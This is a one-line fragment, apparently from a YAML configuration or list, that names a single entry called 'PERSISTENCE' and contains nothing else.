   - name: PERSISTENCE
